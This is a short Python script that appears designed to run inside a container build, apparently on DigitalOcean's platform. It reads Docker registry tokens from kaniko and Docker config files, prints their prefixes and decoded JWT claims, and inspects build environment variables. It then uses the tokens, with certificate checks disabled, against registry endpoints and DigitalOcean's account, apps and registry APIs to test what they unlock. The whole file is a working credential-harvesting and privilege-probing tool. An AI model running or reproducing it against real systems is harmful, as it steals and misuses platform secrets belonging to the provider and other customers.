import json,base64,urllib.request,ssl,os
ctx=ssl._create_unverified_context()
def get(url,headers,timeout=6):
    try:
        r=urllib.request.urlopen(urllib.request.Request(url,headers=headers),timeout=timeout,context=ctx)
        return r.status,r.read(3000),dict(r.headers)
    except Exception as e:
        code=getattr(e,'code',None)
        try: body=e.read(300)
        except Exception: body=b''
        return code or 'ERR', body, {}
tok=None; hosts=[]
for path in ('/kaniko/.docker/config.json','/etc/docker/config.json'):
    try: cfg=json.load(open(path))
    except Exception as e: print('CFGERR',path,repr(e)[:100]); continue
    for host,v in (cfg.get('auths') or {}).items():
        rt=v.get('registrytoken') or ''
        print('HOST',host,'tokenlen',len(rt),'prefix',rt[:8],'dots',rt.count('.'))
        if rt and not tok: tok=rt; hosts.append(host)
        if rt.count('.')==2:
            try:
                p=rt.split('.')[1]; p+='='*(-len(p)%4); claims=json.loads(base64.urlsafe_b64decode(p))
                print('  claims',json.dumps(claims)[:600])
            except Exception as e: print('  claims_err',repr(e)[:80])
        if rt:
            for name,hdr in (('dotline',{'Authorization':'Bearer '+rt}),('basic',{'Authorization':'Basic '+rt})):
                st,b,h=get(f'https://{host}/v2/',hdr)
                print('  v2',name,st,b[:120])
print('APP_IMAGE_URL len',len(os.environ.get('APP_IMAGE_URL','')),'segments',os.environ.get('APP_IMAGE_URL','').count('/'))
print('APP_CACHE_URL len',len(os.environ.get('APP_CACHE_URL','')),'segments',os.environ.get('APP_CACHE_URL','').count('/'))
if tok:
    for name,url in (('catalog','https://registry.digitalocean.com/v2/_catalog?n=5'),('account','https://api.digitalocean.com/v2/account'),('apps','https://api.digitalocean.com/v2/apps?per_page=1'),('reg','https://api.digitalocean.com/v2/registry')):
        st,b,h=get(url,{'Authorization':'Bearer '+tok})
        print('TEST',name,st,b[:240])
print('DONE')
